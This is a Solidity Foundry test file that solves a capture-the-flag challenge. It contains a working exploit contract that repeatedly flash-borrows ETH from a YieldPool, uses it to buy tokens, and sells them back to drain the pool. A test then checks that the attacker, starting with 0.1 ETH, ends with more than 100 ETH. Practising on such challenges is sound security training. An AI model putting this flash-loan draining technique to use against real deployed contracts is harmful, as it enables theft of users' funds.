// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract YieldPoolAttack is IERC3156FlashBorrower {
    YieldPool public yieldPool;
    SecureumToken public token;
    address public owner;

    constructor(YieldPool _yieldPool, SecureumToken _token) {
        yieldPool = _yieldPool;
        token = _token;
        owner = msg.sender;
    }

    function onFlashLoan(address initiator, address, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        require(msg.sender == address(yieldPool), "Untrusted lender");
        require(initiator == address(this), "Untrusted loan initiator");

        // Use all ETH for buying Tokens while paying the loan
        yieldPool.ethToToken{value: address(this).balance}();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner can execute attack");

        while (address(this).balance <= 100 ether) {
            // 1. Flash loan as much ETH as we can afford
            uint256 flashLoanAmount = address(this).balance * 100;
            yieldPool.flashLoan(this, yieldPool.ETH(), flashLoanAmount, "");

            // 2. Exchange Tokens for ETH
            uint256 tokenBalance = token.balanceOf(address(this));
            token.approve(address(yieldPool), tokenBalance);
            yieldPool.tokenToEth(tokenBalance);
        }

        // Send profits back to the owner
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    receive() external payable {}
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Deploy attacker contract
        YieldPoolAttack attackerContract = new YieldPoolAttack(yieldPool, token);

        // Execute the attack
        attackerContract.attack{value: 0.1 ether}();

        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
